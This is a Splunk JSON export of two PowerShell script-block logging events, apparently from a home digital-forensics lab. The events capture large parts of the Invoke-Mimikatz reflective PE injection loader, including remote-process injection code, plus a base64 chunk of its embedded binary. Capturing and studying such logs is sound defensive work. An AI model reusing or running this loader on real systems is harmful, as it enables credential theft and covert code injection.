{"preview":false,"result":{"ComputerName":"DESKTOP-78CU07R","DllMain":"[System.Runtime.InteropServices.Marshal]","DllMainDelegate":"Get-DelegateType","DllMainPtr":"Add-SignedIntAsUnsigned","EventCode":"4104","EventType":"3","ExeMainPtr":"Add-SignedIntAsUnsigned","ImportDescriptor":"[System.Runtime.InteropServices.Marshal]","ImportDescriptorPtr":"Add-SignedIntAsUnsigned","ImportDllHandle":"$Win32Functions.GetModuleHandle.Invoke($ImportDllPath)","ImportDllPath":"[System.Runtime.InteropServices.Marshal]","Keywords":"None","LogName":"Microsoft-Windows-PowerShell/Operational","Mandatory":"$true","Message":"Splunk","OpCode":"On","Output":"[System.Runtime.InteropServices.Marshal]","OutputPtr":"$WStringFunc.Invoke($WStringInput)","PEBytes":"[Byte[]]","PEHandle":"[IntPtr]","PEInfo":"Get-PEDetailedInfo","PELoadedInfo":"Invoke-MemoryLoadLibrary","Position":"0","ProcId":"$Processes[0].ID","ProcInfo":"Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName","Processes":"@(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)","Processor":"$Processors[0]","Processors":"Get-WmiObject","RecordNumber":"596","RemotePEHandle":"$PELoadedInfo[1]","RemoteProcHandle":"[IntPtr]","Sid":"S-1-5-21-1697325460-2044954953-441488130-1001","SidType":"0","SourceName":"Microsoft-Windows-PowerShell","Success":"$Win32Functions.FreeLibrary.Invoke($ImportDllHandle)","TaskCategory":"Execute","ThreadDone":"[System.Runtime.InteropServices.Marshal]","Type":"Warning","User":"NOT_TRANSLATED","VoidFuncAddr":"Get-MemoryProcAddress","WStringFunc":"[System.Runtime.InteropServices.Marshal]","WStringFuncAddr":"Get-MemoryProcAddress","WStringFuncDelegate":"Get-DelegateType","WStringInput":"[System.Runtime.InteropServices.Marshal]","Win32Constants":"Get-Win32Constants","Win32Functions":"Get-Win32Functions","Win32Types":"Get-Win32Types","_raw":"11/23/2025 08:39:14.656 AM\nLogName=Microsoft-Windows-PowerShell/Operational\nEventCode=4104\nEventType=3\nComputerName=DESKTOP-78CU07R\nUser=NOT_TRANSLATED\nSid=S-1-5-21-1697325460-2044954953-441488130-1001\nSidType=0\nSourceName=Microsoft-Windows-PowerShell\nType=Warning\nRecordNumber=596\nKeywords=None\nTaskCategory=Execute a Remote Command\nOpCode=On create calls\nMessage=Splunk could not get the description for this event. Either the component that raises this event is not installed on your local computer or the installation is corrupt.\n\nFormatMessage error:\n\nGot the following information from this event: \n\nunction to instead ExitThread\n\t\t\t#\tThis way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.\n\t\t\t[IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)\n\t\t\tWrite-Verbose \"Call EXE Main function. Address: $ExeMainPtr. Creating thread for the EXE to run in.\"\n\n\t\t\t$Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null\n\n\t\t\twhile($true)\n\t\t\t{\n\t\t\t\t[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)\n\t\t\t\tif ($ThreadDone -eq 1)\n\t\t\t\t{\n\t\t\t\t\tCopy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants\n\t\t\t\t\tWrite-Verbose \"EXE thread has completed.\"\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\tStart-Sleep -Seconds 1\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\t\n\t\treturn @($PEInfo.PEHandle, $EffectivePEHandle)\n\t}\n\t\n\t\n\tFunction Invoke-MemoryFreeLibrary\n\t{\n\t\tParam(\n\t\t[Parameter(Position=0, Mandatory=$true)]\n\t\t[IntPtr]\n\t\t$PEHandle\n\t\t)\n\t\t\n\t\t#Get Win32 constants and functions\n\t\t$Win32Constants = Get-Win32Constants\n\t\t$Win32Functions = Get-Win32Functions\n\t\t$Win32Types = Get-Win32Types\n\t\t\n\t\t$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants\n\t\t\n\t\t#Call FreeLibrary for all the imports of the DLL\n\t\tif ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)\n\t\t{\n\t\t\t[IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)\n\t\t\t\n\t\t\twhile ($true)\n\t\t\t{\n\t\t\t\t$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)\n\t\t\t\t\n\t\t\t\t#If the structure is null, it signals that this is the end of the array\n\t\t\t\tif ($ImportDescriptor.Characteristics -eq 0 `\n\t\t\t\t\t\t-and $ImportDescriptor.FirstThunk -eq 0 `\n\t\t\t\t\t\t-and $ImportDescriptor.ForwarderChain -eq 0 `\n\t\t\t\t\t\t-and $ImportDescriptor.Name -eq 0 `\n\t\t\t\t\t\t-and $ImportDescriptor.TimeDateStamp -eq 0)\n\t\t\t\t{\n\t\t\t\t\tWrite-Verbose \"Done unloading the libraries needed by the PE\"\n\t\t\t\t\tbreak\n\t\t\t\t}\n\n\t\t\t\t$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))\n\t\t\t\t$ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)\n\n\t\t\t\tif ($ImportDllHandle -eq $null)\n\t\t\t\t{\n\t\t\t\t\tWrite-Warning \"Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways\" -WarningAction Continue\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t$Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)\n\t\t\t\tif ($Success -eq $false)\n\t\t\t\t{\n\t\t\t\t\tWrite-Warning \"Unable to free library: $ImportDllPath. Continuing anyways.\" -WarningAction Continue\n\t\t\t\t}\n\t\t\t\t\n\t\t\t\t$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))\n\t\t\t}\n\t\t}\n\t\t\n\t\t#Call DllMain with process detach\n\t\tWrite-Verbose \"Calling dllmain so the DLL knows it is being unloaded\"\n\t\t$DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)\n\t\t$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])\n\t\t$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)\n\t\t\n\t\t$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null\n\t\t\n\t\t\n\t\t$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)\n\t\tif ($Success -eq $false)\n\t\t{\n\t\t\tWrite-Warning \"Unable to call VirtualFree on the PE's memory. Continuing anyways.\" -WarningAction Continue\n\t\t}\n\t}\n\n\n\tFunction Main\n\t{\n\t\t$Win32Functions = Get-Win32Functions\n\t\t$Win32Types = Get-Win32Types\n\t\t$Win32Constants =  Get-Win32Constants\n\t\t\n\t\t$RemoteProcHandle = [IntPtr]::Zero\n\t\n\t\t#If a remote process to inject in to is specified, get a handle to it\n\t\tif (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne \"\"))\n\t\t{\n\t\t\tThrow \"Can't supply a ProcId and ProcName, choose one or the other\"\n\t\t}\n\t\telseif ($ProcName -ne $null -and $ProcName -ne \"\")\n\t\t{\n\t\t\t$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)\n\t\t\tif ($Processes.Count -eq 0)\n\t\t\t{\n\t\t\t\tThrow \"Can't find process $ProcName\"\n\t\t\t}\n\t\t\telseif ($Processes.Count -gt 1)\n\t\t\t{\n\t\t\t\t$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId\n\t\t\t\tWrite-Output $ProcInfo\n\t\t\t\tThrow \"More than one instance of $ProcName found, please specify the process ID to inject in to.\"\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\t$ProcId = $Processes[0].ID\n\t\t\t}\n\t\t}\n\t\t\n\t\t#Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.\n\t\t#If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege\n#\t\tif ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)\n#\t\t{\n#\t\t\tWrite-Verbose \"Getting SeDebugPrivilege\"\n#\t\t\tEnable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants\n#\t\t}\t\n\t\t\n\t\tif (($ProcId -ne $null) -and ($ProcId -ne 0))\n\t\t{\n\t\t\t$RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)\n\t\t\tif ($RemoteProcHandle -eq [IntPtr]::Zero)\n\t\t\t{\n\t\t\t\tThrow \"Couldn't obtain the handle for process ID: $ProcId\"\n\t\t\t}\n\t\t\t\n\t\t\tWrite-Verbose \"Got the handle for the remote process to inject in to\"\n\t\t}\n\t\t\n\n\t\t#Load the PE reflectively\n\t\tWrite-Verbose \"Calling Invoke-MemoryLoadLibrary\"\n\n        try\n        {\n            $Processors = Get-WmiObject -Class Win32_Processor\n        }\n        catch\n        {\n            throw ($_.Exception)\n        }\n\n        if ($Processors -is [array])\n        {\n            $Processor = $Processors[0]\n        } else {\n            $Processor = $Processors\n        }\n\n        if ( ( $Processor.AddressWidth) -ne (([System.IntPtr]::Size)*8) )\n        {\n            Write-Verbose ( \"Architecture: \" + $Processor.AddressWidth + \" Process: \" + ([System.IntPtr]::Size * 8))\n            Write-Error \"PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS.\" -ErrorAction Stop\n        }\n\n        #Determine whether or not to use 32bit or 64bit bytes\n        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)\n        {\n            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)\n        }\n        else\n        {\n            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)\n        }\n        $PEBytes[0] = 0\n        $PEBytes[1] = 0\n\t\t$PEHandle = [IntPtr]::Zero\n\t\tif ($RemoteProcHandle -eq [IntPtr]::Zero)\n\t\t{\n\t\t\t$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs\n\t\t}\n\t\telse\n\t\t{\n\t\t\t$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle\n\t\t}\n\t\tif ($PELoadedInfo -eq [IntPtr]::Zero)\n\t\t{\n\t\t\tThrow \"Unable to load PE, handle returned is NULL\"\n\t\t}\n\t\t\n\t\t$PEHandle = $PELoadedInfo[0]\n\t\t$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process\n\t\t\n\t\t\n\t\t#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.\n\t\t$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants\n\t\tif (($PEInfo.FileType -ieq \"DLL\") -and ($RemoteProcHandle -eq [IntPtr]::Zero))\n\t\t{\n\t\t\t#########################################\n\t\t\t### YOUR CODE GOES HERE\n\t\t\t#########################################\n                    Write-Verbose \"Calling function with WString return type\"\n\t\t\t\t    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName \"powershell_reflective_mimikatz\"\n\t\t\t\t    if ($WStringFuncAddr -eq [IntPtr]::Zero)\n\t\t\t\t    {\n\t\t\t\t\t    Throw \"Couldn't find function address.\"\n\t\t\t\t    }\n\t\t\t\t    $WStringFuncDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])\n\t\t\t\t    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)\n                    $WStringInput = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArgs)\n\t\t\t\t    [IntPtr]$OutputPtr = $WStringFunc.Invoke($WStringInput)\n                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)\n\t\t\t\t    if ($OutputPtr -eq [IntPtr]::Zero)\n\t\t\t\t    {\n\t\t\t\t    \tThrow \"Unable to get output, Output Ptr is NULL\"\n\t\t\t\t    }\n\t\t\t\t    else\n\t\t\t\t    {\n\t\t\t\t        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)\n\t\t\t\t        Write-Output $Output\n\t\t\t\t        $Win32Functions.LocalFree.Invoke($OutputPtr);\n\t\t\t\t    }\n\t\t\t#########################################\n\t\t\t### END OF YOUR CODE\n\t\t\t#########################################\n\t\t}\n\t\t#For remote DLL injection, call a void function which takes no parameters\n\t\telseif (($PEInfo.FileType -ieq \"DLL\") -and ($RemoteProcHandle -ne [IntPtr]::Zero))\n\t\t{\n\t\t\t$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName \"VoidFunc\"\n\t\t\tif (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))\n\t\t\t{\n\t\t\t\tThrow \"VoidFunc couldn't be found in the DLL\"\n\t\t\t}\n\t\t\t\n\t\t\t$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle\n\t\t\t$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle\n\t\t\t\n\t\t\t#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors\n\t\t\t$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions\n\t\t}\n\t\t\n\t\t#Don't free a library if it is injected in a remote process\n\t\tif ($RemoteProcHandle -eq [IntPtr]::Zero)\n\t\t{\n\t\t\tInvoke-MemoryFreeLibrary -PEHandle $PEHandle\n\t\t}\n\t\telse\n\t\t{\n\t\t\t#Just delete the memory allocated in PowerShell to build the PE before injecting to remote process\n\t\t\t$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)\n\t\t\tif ($Success -eq $false)\n\t\t\t{\n\t\t\t\tWrite-Warning \"Unable to call VirtualFree on the PE's memory. Continuing anyways.\" -WarningAction Continue\n\t\t\t}\n\t\t}\n\t\t\n\t\tWrite-Verbose \"Done!\"\n\t}\n\n\tMain\n}\n8a275253-2ef8-49ec-81bc-f0732490f5a8","_time":"2025-11-23T14:39:14.656+0000","category":"Execute","dvc":"DESKTOP-78CU07R","dvc_nt_host":"DESKTOP-78CU07R","event_id":"596","eventtype":["endpoint_services_processes","windows_event_signature","windows_ta_data"],"host":"DESKTOP-78CU07R","id":"596","index":"mydfir-project","linecount":"292","punct":"//_::._=--/===-==-------==--====___=__=________.__","severity":"medium","severity_id":"3","signature_id":"4104","source":"Microsoft-Windows-PowerShell/Operational","sourcetype":"WinEventLog","splunk_server":"chalitha-splunk","tag":"track_event_signatures","tag::eventtype":"track_event_signatures","vendor_product":"Microsoft Windows"}}
{"preview":false,"result":{"ComputerName":"DESKTOP-78CU07R","EventCode":"4104","EventType":"3","Keywords":"None","LogName":"Microsoft-Windows-PowerShell/Operational","Message":"Splunk","OpCode":"On","RecordNumber":"505","Sid":"S-1-5-21-1697325460-2044954953-441488130-1001","SidType":"0","SourceName":"Microsoft-Windows-PowerShell","TaskCategory":"Execute","Type":"Warning","User":"NOT_TRANSLATED","_raw":"11/23/2025 08:39:14.630 AM\nLogName=Microsoft-Windows-PowerShell/Operational\nEventCode=4104\nEventType=3\nComputerName=DESKTOP-78CU07R\nUser=NOT_TRANSLATED\nSid=S-1-5-21-1697325460-2044954953-441488130-1001\nSidType=0\nSourceName=Microsoft-Windows-PowerShell\nType=Warning\nRecordNumber=505\nKeywords=None\nTaskCategory=Execute a Remote Command\nOpCode=On create calls\nMessage=Splunk could not get the description for this event. Either the component that raises this event is not installed on your local computer or the installation is corrupt.\n\nFormatMessage error:\n\nGot the following information from this event: \n\n8AXJkKAK6ZCgCMpw8ABJoKAJqcCgCs4w8AsJwKAMCcCgDg4w8AAJ0KAIidCgDcpw8AiJ0KAIWeCgDo4w8AkJ4KACKiCgA45A8AJKIKAK2iCgAo5A8AsKIKABWjCgAMpA8AGKMKANGjCgDcpw8A1KMKAPukCgBc5A8AIKUKAJClCgB85A8AkKUKALClCgCopA8AsKUKAEamCgCE5A8ASKYKAG+mCgC4xg8AcKYKAHapCgBY3w8AeKkKAKapCgAUpA8AqKkKAMWpCgCMpw8AyKkKAESqCgCQ5A8ARKoKAGOqCgCMpw8AZKoKAHWqCgAUpA8A0KoKAB2rCgC45A8AUKsKAG2rCgAUpA8AcKsKAMurCgDc5A8A4KsKAAGsCgDo5A8ABKwKADisCgCMpw8AOKwKAAmtCgDw4Q8ADK0KAB+tCgAUpA8AIK0KALutCgCYzg8AvK0KACmuCgDs5A8ALK4KAJ2uCgD45A8AsK4KAAGvCgAI5Q8ABK8KAC2vCgAQ5Q8AQK8KAAewCgAY5Q8AILAKACKwCgAo1w8AMLAKAIywCgC8rQ8AjLAKAOiwCgD4rQ8A6LAKAAixCgA0ww8ACLEKACixCgCYww8AKLEKAEixCgD4rQ8ASLEKAKSxCgCYww8ApLEKAMSxCgA81A8AxLEKANuxCgCYww8A27EKAPexCgCYww8A97EKAC2yCgA0ww8ALbIKAEWyCgAQ1w8ARbIKANuyCgBc1w8A27IKAPayCgCYww8A9rIKABCzCgCYww8AELMKACmzCgCYww8AKbMKAEGzCgCYww8AQbMKAGyzCgCYww8AbLMKAIazCgCYww8AhrMKAKGzCgCYww8AobMKALqzCgCYww8AurMKANezCgCYww8A17MKAPGzCgCYww8A8bMKAAq0CgCYww8ACrQKACO0CgCYww8AI7QKADy0CgCYww8APLQKAFa0CgCYww8AVrQKAG20CgCYww8AbbQKAIa0CgCYww8AhrQKAJy0CgCYww8AnLQKAMC0CgCYww8AwLQKABO1CgD4rQ8AE7UKACy1CgCYww8ALLUKAFi1CgCYww8AWLUKAHG1CgA0ww8AgLUKAKC1CgCYww8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD+sAgA+7AIACexCAD3sAgABLEIABSxCAAksQgA9LAIACyxCAAIsQgAQLEIADCxCAAAsQgAELEIACCxCADwsAgASLEIAAAAAAAAAAAAAAAAAKC0CAC/tAgAobQIAK+0CADotAgA8LQIAAC1CAAQtQgAqLQIAEC1CABQtQgA0LQIAGC1CAAotQgAcLUIAJC1CADFtAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAYAAAAGAAAgAAAAAAAAAAAAAAAAAAAAQACAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAJBAAASAAAAGAwEQAkAgAAAAAAAAAAAAAAAAAAAAAAAO+7vzw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04IiBzdGFuZGFsb25lPSJ5ZXMiPz4NCjxhc3NlbWJseSB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjEiIG1hbmlmZXN0VmVyc2lvbj0iMS4wIj48dHJ1c3RJbmZvIHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MyI+PHNlY3VyaXR5PjxyZXF1ZXN0ZWRQcml2aWxlZ2VzPjxyZXF1ZXN0ZWRFeGVjdXRpb25MZXZlbCBsZXZlbD0iYXNJbnZva2VyIiB1aUFjY2Vzcz0iZmFsc2UiPjwvcmVxdWVzdGVkRXhlY3V0aW9uTGV2ZWw+PC9yZXF1ZXN0ZWRQcml2aWxlZ2VzPjwvc2VjdXJpdHk+PC90cnVzdEluZm8+PGFwcGxpY2F0aW9uIHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MyI+PHdpbmRvd3NTZXR0aW5ncz48ZHBpQXdhcmUgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vU01JLzIwMDUvV2luZG93c1NldHRpbmdzIj50cnVlPC9kcGlBd2FyZT48L3dpbmRvd3NTZXR0aW5ncz48L2FwcGxpY2F0aW9uPjwvYXNzZW1ibHk+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA0AoABAEAAEChSKFooXCheKGAoZihoKGoodii8KL4ooijkKOgo7CjwKPQo+Cj8KMApBCkIKQwpECkUKRgpHCkgKSQpKCksKTApNCk4KTwpAClEKUgpTClQKVQpWClcKWApZCloKWwpcCl0KXgpfClAKYQpiCmMKZAplCmYKZwpoCmkKagprCmwKbQpuCm8KYApxCnIKcwp0CnUKdgp3CngKeQp6CnsKfAp9Cn4KfwpwCoEKggqDCoQKhQqGCocKiAqJCooKiwqMCo0KjgqPCoAKkQqSCpMKlAqVCpYKlwqYCpkKmgqbCpwKnQqeCp8KkAqhCqIKowqkCqUKpgqnCqgKoAAADgCgAQAAAAOKFAoUihAAAA8AoAEAEAANCg4KDwoPigAKEIoRChGKEgoSihOKFAoUihUKFYoWChaKFwoYihmKGgoaihsKG4oYCjiKOQo5ijoKOoo7CjuKPAo8ij0KPYo+Cj6KPwo/ijAKQIpBCkGKQgpCikMKQ4pECkSKRQpFikYKRopHCkeKSApIikkKSYpKCkqKSwpLikwKTIpNCk4KTopPCk+KQApQilEKUYpSClKKUwpTilQKVIpVClWKVgpWilcKV4pYCliKWQpZiloKWopbCluKXApcil0KXYpeCl6KXwpfilAKYIphCmGKYgpiimMKY4pgCqCKoQqhiqIKooqjCqOKpAqkiqUKpYqmCqaKpwqniqgKqIqpCqmKoAAAAACwDAAAAA8Kn4qQCqCKqIqpiqqKq4qsiq2KroqviqCKsYqyirOKtIq1iraKt4q4irmKuoq7iryKvYq+ir+KsIrBisKKw4rEisWKxorHisiKyYrKisuKzIrNis6Kz4rAitGK0orTitSK1YrWiteK2IrZitqK24rcit2K3orfitCK4YriiuOK5IrliuaK54roiumK6orriuyK7Yruiu+K4IrxivKK84r0ivWK9or3iviK+Yr6ivuK/Ir9iv6K/4rwAQCwAgAQAACKAYoCigOKBIoFigaKB4oIigmKCooLigyKDYoOig+KAIoRihKKE4oUihWKFooXihiKGYoaihuKHIodih6KH4oQiiGKIoojiiSKJYomiieKKIopiiqKK4osii2KLooviiCKMYoyijOKNIo1ijaKN4o4ijmKOoo7ijyKPYo+ij+KMIpBikKKQ4pEikWKRopHikiKSYpKikuKTIpNik6KT4pAilGKUopTilSKVYpWileKWIpZilqKW4pcil2KXopfilCKYYpiimOKZIplimaKZ4poimmKaoprimyKbYpuim+KYIpxinKKc4p0inWKdop3iniKeYp6inuKfIp9in6Kf4pwioGKgoqDioSKhYqGioeKiIqJioqKi4qAAgCwBsAQAA4KTwpAClEKUgpTClQKVQpWClcKWApZCloKWwpcCl0KXgpfClAKYQpiCmMKZAplCmYKZwpoCmkKagprCmwKbQpuCm8KYApxCnIKcwp0CnUKdgp3CngKeQp6CnsKfAp9Cn4KfwpwCoEKggqDCoQKhQqGCocKiAqJCooKiwqMCo0KjgqPCoAKkQqSCpMKlAqVCpYKlwqYCpkKmgqbCpwKnQqeCp8KkAqhCqIKowqkCqUKpgqnCqgKqQqqCqsKrAqtCq4KrwqgCrEKsgqzCrQKtQq2CrcKuAq5CroKuwq8Cr0Kvgq/CrAKwQrCCsMKxArFCsYKxwrICskKygrLCswKzQrOCs8KwArRCtIK0wrUCtUK1grXCtgK2QraCtsK3ArdCt4K3wrQCuEK4grjCuQK5QrmCucK6ArpCuoK6wrsCu0K7grvCuAK8QryCvMK9Ar1CvYK9wr4CvkK+gr7CvwK/Qr+Cv8K8AMAsAbAAAAACgEKAgoDCgQKBQoGCgcKCAoJCgoKCwoMCg0KDgoPCgAKEQoSChMKFAoVChYKFwoYChkKGgobChwKHQoeCh8KEAohCiIKIwokCiUKJgonCigKKQoqCisKLAotCi4KLwogCjEKMAUAsASAAAACioMKi4rsiu2K7orviuCK8QrxivIK8orzCvOK9Ar0ivUK9Yr2CvaK9wr3ivgK+Ir5CvoK+wr8Cv0K/gr/CvAAAAYAsA/AEAAACgEKAgoDCgQKBQoGCgcKCAoJCgoKCwoMCg0KDgoPCgAKEQoSChMKFAoVChYKFwoYChkKGgobChwKHQoeCh8KEAohCiIKIwokCiUKJgoniiiKK4osCiyKLQotii4KLoovCi+KIAowijEKMYoyCjKKMwozijQKNIo1CjWKNgo3CjgKOQo6CjsKPAo9CjYKRopHCkeKSApIikkKSYpKCkqKSwpLikQKVQpWClcKWApZCloKWwpcCl0KXgpfClAKYQpiCmMKZAplCmYKZopnCmeKaApoimkKaYpqCmqKawprimwKbIptCm2Kbgpuim8Kb4pgCnCKcQpxinIKcwp0CnUKdgp3CngKeQp6CnsKfAp9Cn4KfwpwCoEKggqDCoQKhQqGCocKiAqJCooKiwqMCo0KjgqPCoAKkQqSCpMKlAqVCpYKlwqYCpkKmgqbCpwKnQqeCp8KkAqhCqIKowqkCqUKpgqnCqgKqQqqCqsKrAqtCq4KrwqgCrEKsgqzCrQKtQq2CrcKuAq5CroKuwq8Cr0Kvgq/CrAKwQrCCsMKxArFCsYKxwrICskKywrLiswKzIrNCs4KzorPCs+KwArQitEK0YrSCtKK0wrTitQK1IrWiteK2IraCt8K74rgCvCK8wr6ivsK+4r8Cv0K/Yr+Cv6K/wr/ivAHALAJAAAAAAoAigEKAYoCCgKKAwoDigQKBIoGCgeKCQoKigwKDYoPCgCKEgoTihUKFooYChmKGwocih4KH4oRCiKKI4osCiyKLQotii4KLoovCi+KIgoyijMKM4o2CjuKOgpKiksKTApOCkaKUgpiimMKY4pmCmuKbwqACpCKkQqRipQKkAqgiqEKoYqkCqAIALAAABAACQpZiloKWopdClgKagprCmuKbAptCm8Kawp7inwKfIp9Cn2Kfgp+in8Kf4pwCoCKgQqBioIKgoqDCoOKhQqFioYKhoqJComKigqKiosKi4qMCoyKjQqNio4KjoqPCo+KgAqQipEKkYqSCpKKkwqTipYKnYqeCp6Knwq/irAKwIrBCsKKxArFiscKyIrKCsuKzQrOisAK0YrTCtOK1ArUitUK1YrWCtaK1wrXitgK2IrZitoK2orbCtuK3Arcit0K3YreCt6K3wrfitCK4QrhiuIK4orjCuOK5IrlCuWK5groCuiK6QrpiuoK6orrCuuK7Arsiu0K4AAACQCwBsAAAAaKdwp3ingKeIp5CnOKhAqEioUKhYqJiooKioqLCoCKkQqhiqIKooqjCqSKpQqliqYKpoqnCqeKqAqoiqkKqYqqCqyKrQqqitsK24rcCtyK3Qrdit4K3orfCt+K0AriiuMK4AAACgCwAcAAAAWKFoobCsuKzArMis0KzYrOCsAAAAsAsAaAE